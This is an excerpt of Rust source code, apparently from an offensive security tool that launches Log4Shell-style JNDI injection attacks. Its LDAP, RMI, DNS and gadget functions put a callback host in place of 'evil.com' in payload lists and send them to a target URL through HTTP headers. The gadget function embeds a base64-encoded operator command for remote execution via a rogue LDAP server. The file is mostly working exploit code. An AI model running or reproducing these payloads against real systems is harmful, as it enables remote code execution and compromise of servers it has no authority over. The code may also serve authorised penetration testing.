...
pub async fn ldap(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} JNDI LDAP Injection (Log4Shell-style)",
        "[*]".cyan().bold()
    );
    ...
    let payloads: Vec<String> = LDAP_PAYLOADS
        .iter()
        .map(|p| p.replace("evil.com", callback))
        .collect();
    let headers_list = [
        "User-Agent",
        "X-Api-Version",
    ...
    for (i, payload) in payloads.iter().enumerate() {
        for header in &headers_list {
            if let Ok(resp) = client.get(url).header(*header, payload).send().await {
                sent += 1;
    ...
    println!(
        "\n{} {} total requests sent with LDAP JNDI payloads",
        "[*]".cyan().bold(),
        sent
    );
    println!(
        "{} Check callback host for incoming LDAP connections.",
        "[!]".red().bold()
    );
    Ok(())
}
...
pub async fn rmi(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let payloads: Vec<String> = RMI_PAYLOADS
        .iter()
        .map(|p| p.replace("evil.com", callback))
        .collect();
    let mut sent = 0;
    ...
    println!(
        "\n{} {} RMI payloads sent. Check callback for connections.",
        "[*]".cyan().bold(),
        sent
    );
    Ok(())
...
pub async fn dns(url: &str, callback: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} JNDI DNS Injection (Blind Detection)",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
            ...
            .await
        {
            Ok(resp) => {
                ...
                println!(
                    ...
                    i + 1,
                    resp.status().as_u16(),
                    p.chars().take(50).collect::<String>()
                );
            }
            Err(_) => {
                println!("  {} [{:02}] error", "*".red(), i + 1);
    ...
    println!(
        "\n{} {} DNS payloads sent. Check callback for DNS queries.",
        "[*]".cyan().bold(),
        sent
    );
    println!(
        "{} DNS-based JNDI is the safest blind detection method.",
        "[*]".cyan().bold()
    );
    Ok(())
}
...
pub async fn gadget(url: &str, callback: &str, timeout: u64, cmd: &str) -> anyhow::Result<()> {
    ...
    for (i, payload) in GADGET_PAYLOADS.iter().enumerate() {
        let p = payload
            .replace("evil.com", callback)
            .replace("aWQ=", &cmd_b64);
        match client
            .get(url)
            .header("User-Agent", &p)
            .header("X-Api-Version", &p)
            .header("Referer", &p)
            .send()
            .await
        {
    ...
    println!(
        "\n{} {} gadget payloads sent with cmd='{}'",
        "[*]".cyan().bold(),
        sent,
        cmd
    );
    println!(
        "{} Requires a rogue LDAP server on callback host serving gadget classes.",
        "[*]".cyan().bold()
    );
    Ok(())
}
